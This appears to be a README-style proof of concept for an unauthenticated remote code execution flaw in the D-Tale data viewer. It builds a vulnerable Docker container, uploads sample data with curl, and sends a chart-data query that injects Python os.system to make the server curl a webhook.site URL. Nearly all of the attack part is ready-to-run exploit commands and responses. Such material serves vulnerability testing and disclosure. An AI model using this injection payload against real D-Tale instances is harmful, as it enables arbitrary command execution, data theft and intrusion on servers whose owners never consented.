# setup a D-Tale inance without need of authentication 
```bash
cd Vulnerable/
docker build -t dtale-expose-ui .
docker run --rm --name dtale-vulnerable -p 40000:40000 dtale-expose-ui
```
now use the following command to exploit the vulnerability
```bash
# upload sample data
curl 'http://127.0.0.1:40000/dtale/upload' \
  -X POST \
  -H 'Content-Type: multipart/form-data; boundary=----geckoformboundaryb38fffc548bd5dad82328985c3f223d4' \
  --data-binary \
  $'------geckoformboundaryb38fffc548bd5dad82328985c3f223d4\r\nContent-Disposition: form-data; name="simple-dtale-data.csv"; filename="simple-dtale-data.csv"\r\nContent-Type: text/csv\r\n\r\n------geckoformboundaryb38fffc548bd5dad82328985c3f223d4\r\nContent-Disposition: form-data; name="header"\r\n\r\ntrue\r\n------geckoformboundaryb38fffc548bd5dad82328985c3f223d4\r\nContent-Disposition: form-data; name="separatorType"\r\n\r\ncomma\r\n------geckoformboundaryb38fffc548bd5dad82328985c3f223d4\r\nContent-Disposition: form-data; name="separator"\r\n\r\n\r\n------geckoformboundaryb38fffc548bd5dad82328985c3f223d4--\r\n'
    # response: 200 OK, body: {"data_id":"1","success":true}
  
  
# replace https://webhook with your webhook URL
curl -v 'http://127.0.0.1:40000/dtale/chart-data/1?query=%40pd.core.frame.com.builtins.__import__%28%22os%22%29.system%28%22%22%22curl%20https://webhook.site/fdda6d40-04ad-44d9-922c-d5c6e2359330%20%23%22%22%22%29'
# response: 200 OK, body: {"error":"'Series' object has no attribute 'columns....
```